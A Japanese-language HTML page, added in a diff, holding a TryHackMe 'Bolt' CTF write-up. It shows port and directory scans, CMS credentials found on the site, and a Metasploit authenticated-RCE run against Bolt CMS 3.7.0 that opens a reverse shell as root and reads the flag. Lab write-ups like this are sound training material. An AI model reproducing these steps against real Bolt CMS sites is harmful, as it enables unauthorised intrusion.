@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Bolt Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Bolt</h1>
+    <p>Bolt CMS (:8000)、認証情報漏洩、認証済み RCE、root シェル。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p><code>nmap</code>を実施</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.161.175 -T4 -p-
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 09:21 +0900
+Nmap scan report for 10.48.161.175
+Host is up (0.13s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 46.15 seconds
+</code></pre>
+<p><code>ssh</code>と<code>http</code>が開いている<br>
+また8000番に<code>http-alt</code>というサービスがopenしている</p>
+<p><code>feroxbuster</code>を実施したがめぼしい結果は得られず</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ feroxbuster -u http://10.49.138.219
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.49.138.219/
+ 🚩  In-Scope Url          │ 10.49.138.219
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       15l       74w     6147c http://10.49.138.219/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://10.49.138.219/
+[####################] - 87s    30005/30005   0s      found:2       errors:0      
+[####################] - 87s    30000/30000   345/s   http://10.49.138.219/   
+</code></pre>
+<p><code>10.49.138.219</code>の後ろにポート番号を明示しなかった場合、URLスキームにしたがって<code>http://</code>は８０番ポートを見る<br>
+今回は８０００番ポートにもhttpがあるので明示して調べる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ feroxbuster -u http://10.49.138.219:8000
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.49.138.219:8000/
+ 🚩  In-Scope Url          │ 10.49.138.219
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET      136l      343w     5516c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        8l      116w     6882c http://10.49.138.219:8000/theme/base-2018/css/theme.css
+200      GET      147l      328w     5551c http://10.49.138.219:8000/search
+200      GET      128l      301w     4992c http://10.49.138.219:8000/pages
+200      GET       10l      357w    34688c http://10.49.138.219:8000/theme/base-2018/js/app.js
+200      GET      280l      440w     8643c http://10.49.138.219:8000/entry/message-for-it-department
+
+（中略）
+
+4      GET      289l     1524w   149111c http://10.49.138.219:8000/home/bolt/app/cache/profiler/f1/32/b432f1
+404      GET      216l     1082w    97032c http://10.49.138.219:8000/weird-world
+[####################] - 20m    30880/30880   0s      found:1430    errors:2740   
+[####################] - 20m    30000/30000   25/s    http://10.49.138.219:8000/  
+</code></pre>
+<p>ということで８０番ポートのほうは何も得られなかったが<br>
+８０００番ポートのほうは色々調べたほうがよいなということが分かった</p>
+<p>実際にブラウザで調べる<br>
+<img alt="Pasted image 20260518144746" src="bolt/images/01-Pasted-image-20260518144746.png"><br>
+管理者からのメッセージがホーム画面にあり、ユーザーネーム<code>bolt</code>をゲットした<br>
+<img alt="Pasted image 20260518144845" src="bolt/images/02-Pasted-image-20260518144845.png"><br>
+またIT部門へのメッセージもありパスワード<code>boltadmin123</code>をゲットした<br>
+これはsshなどではなく単にCMSのクレデンシャルであろう<br>
+「bolt cms login」で検索すると公式wikiがヒットして<code>/bolt</code>をチェックするのが良さそうであることが分かった</p>
+<p>writeupも見ながら進めているので正直答えは知っているんだけど<br>
+アクセスできない<br>
+どうも今日はtryhackmeの調子が悪いのだろうか</p>
+<p>再起動したらアクセスできるようになった<br>
+公式wikiの情報を参考に<code>/bolt/login</code>にアクセスする<br>
+<img alt="Pasted image 20260518151302" src="bolt/images/03-Pasted-image-20260518151302.png"><br>
+ログインできたダッシュボードの左下にバージョン情報が書いてある<br>
+<img alt="Pasted image 20260518152557" src="bolt/images/04-Pasted-image-20260518152557.png"></p>
+<p>これをもとにいったん脆弱性を検索してみる<br>
+まず<code>searchsploit</code>はバージョン情報的に有益なものはなさそうであった</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ searchsploit bolt                          
+------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                    |  Path
+------------------------------------------------------------------ ---------------------------------
+Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer O | multiple/dos/41869.html
+Bolt CMS 3.6.10 - Cross-Site Request Forgery                      | php/webapps/47501.txt
+Bolt CMS 3.6.4 - Cross-Site Scripting                             | php/webapps/46495.txt
+Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Executi | php/webapps/46664.html
+Bolt CMS 3.7.0 - Authenticated Remote Code Execution              | php/webapps/48296.py
+Bolt CMS &lt; 3.6.2 - Cross-Site Scripting                           | php/webapps/46014.txt
+Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow           | multiple/remote/24982.txt
+BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulne | php/webapps/36552.txt
+BoltWire 6.03 - Local File Inclusion                              | php/webapps/48411.txt
+Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities       | php/webapps/21132.txt
+CMS Bolt - Arbitrary File Upload (Metasploit)                     | php/remote/38196.rb
+------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>どうやらthmの問題文に従うと、この<code>3.7.0</code>にRCEエクスプロイトを使うらしい</p>
+<p>metasploitにもあったのでセッティングしていく</p>
+<pre><code class="language-bash">msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set PASSWORD boltadmin123
+PASSWORD =&gt; boltadmin123
+msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set RHOSTS 10.49.167.133
+RHOSTS =&gt; 10.49.167.133
+msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set USERNAME bolt
+USERNAME =&gt; bolt
+msf exploit(unix/webapp/bolt_authenticated_rce) &gt; set LHOST tun0
+LHOST =&gt; 192.168.205.211
+msf exploit(unix/webapp/bolt_authenticated_rce) &gt; 
+</code></pre>
+<p><code>run</code>する</p>
+<pre><code class="language-bash">msf exploit(unix/webapp/bolt_authenticated_rce) &gt; run
+[*] Started reverse TCP handler on 192.168.205.211:4444 
+[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
+[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable &quot;ztyvn&quot;.
+[*] Found 3 potential token(s) for creating .php files.
+[+] Used token 0dbb8a7d0a05a9149eb6531fb2 to create xjbeqpnxn.php.
+[*] Attempting to execute the payload via &quot;/files/xjbeqpnxn.php?ztyvn=`payload`&quot;
+[!] No response, may have executed a blocking payload!
+[*] Command shell session 2 opened (192.168.205.211:4444 -&gt; 10.49.167.133:33024) at 2026-05-18 15:39:59 +0900
+[+] Deleted file xjbeqpnxn.php.
+[+] Reverted user profile back to original state.
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+pwd
+/home/bolt/public/files
+
+ls /
+app
+bin
+boot
+cdrom
+dev
+etc
+extensions
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+public
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+
+ls /root
+
+ls
+index.html
+
+ls /home
+bolt
+composer-setup.php
+flag.txt
+
+cat /home/flag.txt
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
+
+
+
+</code></pre>
+<p>とれました</p>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/bolt">https://tryhackme.com/room/bolt</a></p>
+  </footer>
+</body>
+</html>
